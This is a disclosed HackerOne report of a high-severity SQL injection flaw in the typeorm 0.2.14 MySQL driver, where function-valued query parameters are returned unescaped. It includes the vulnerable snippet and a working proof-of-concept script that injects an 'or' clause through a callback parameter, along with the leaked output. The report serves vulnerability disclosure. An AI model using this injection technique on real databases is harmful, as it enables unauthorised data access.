# [typeorm] SQL Injection

## Report Details
- **Report ID**: 506654
- **URL**: https://hackerone.com/reports/506654
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-03-08T07:49:04.488Z
- **Disclosed**: 2019-04-02T04:25:24.379Z

## Reporter
- **Username**: verichains
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report SQL Injection in typeorm.
It allows reading data from database.

# Module

**module name:** typeorm
**version:** 0.2.14
**npm page:** `https://www.npmjs.com/package/typeorm`

## Module Description

> TypeORM is an ORM that can run in NodeJS, Browser, Cordova, PhoneGap, Ionic, React Native, NativeScript, Expo, and Electron platforms and can be used with TypeScript and JavaScript (ES5, ES6, ES7, ES8). Its goal is to always support the latest JavaScript features and provide additional features that help you to develop any kind of application that uses databases - from small applications with a few tables to large scale enterprise applications with multiple databases.

> TypeORM supports both Active Record and Data Mapper patterns, unlike all other JavaScript ORMs currently in existence, which means you can write high quality, loosely coupled, scalable, maintainable applications the most productive way.



## Module Stats

> Replace stats below with numbers from npm’s module page:

79,749 downloads in the last week

# Vulnerability

## Vulnerability Description

Method `escapeQueryWithParameters` of `MysqlDriver.ts` directly return value from parameter if it is a function without escaping which allow attacker to perform SQL Injection in specialized context.
https://github.com/typeorm/typeorm/blob/d9f5581b22c4cccfab55ee23fad699e1c8acadf8/src/driver/mysql/MysqlDriver.ts#L387

```ts
            if (value instanceof Function) {
                return value();

            } else {
                escapedParameters.push(value);
                return "?";
            }
```

I'm not sure if this is intended or not, there's no information in the document, if someone used this pattern (value provided by a function callback) it will lead to sql injection attack.


## Steps To Reproduce:

- Create a new test typeorm package
```bash
npx typeorm init --name Test --database mysql
```

- Edit `ormconfig.json` for local credentials.

Modify `index.ts` to test the injection:

```ts
import "reflect-metadata";
import {createConnection} from "typeorm";
import {User} from "./entity/User";

createConnection().then(async connection => {

    console.log("Inserting a new user into the database...");

    for(var i=0;i<10;i++) {
        const user = new User();
        user.firstName = `Timber ${i}`;
        user.lastName = "Saw";
        user.age = 25 + i;
        await connection.manager.save(user);
        console.log("Saved a new user with id: " + user.id);
    }

    const repo = connection.getRepository(User);

    console.log(await repo.createQueryBuilder().where('firstName = :name', {name: () => "-1 or firstName=0x54696d6265722033"}).getOne());

    process.exit(0);
}).catch(error => console.log(error));
```
(0x54696d6265722033 is "Timber 3")

Output:
```
Inserting a new user into the database...
User { id: 5, firstName: 'Timber 3', lastName: 'Saw', age: 28 }
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- MacOs
- NodeJS v8.12.0
- npm 6.4.1

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Allow attackers to perform SQL Injection attacks.

## Attachments
No attachments
